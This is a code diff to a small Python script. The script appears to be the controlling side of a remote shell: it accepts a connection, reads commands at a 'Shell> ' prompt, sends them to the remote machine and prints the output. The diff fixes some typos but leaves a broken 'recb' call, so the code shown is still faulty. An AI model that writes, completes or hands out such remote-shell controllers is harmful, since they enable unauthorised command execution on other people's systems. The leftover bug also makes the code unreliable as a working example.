@@ -21,13 +21,13 @@ def connection() :
     print(f'remote connection: {remote_ip}')
 
     while True :
-        command = imput("Shell> ")
-        if 'exit' in comando :
+        command = input("Shell> ")
+        if 'exit' in command :
             remote_socket.send('exit'.encode())
             remote_socket.close()
             break
         else :
             remote_socket.send(command.encode())
-            print(remote_socket.recb(1024).decode("utf8", ignore))
+            print(remote_socket.recb(1024).decode("utf8", "ignore"))
 
 connection()
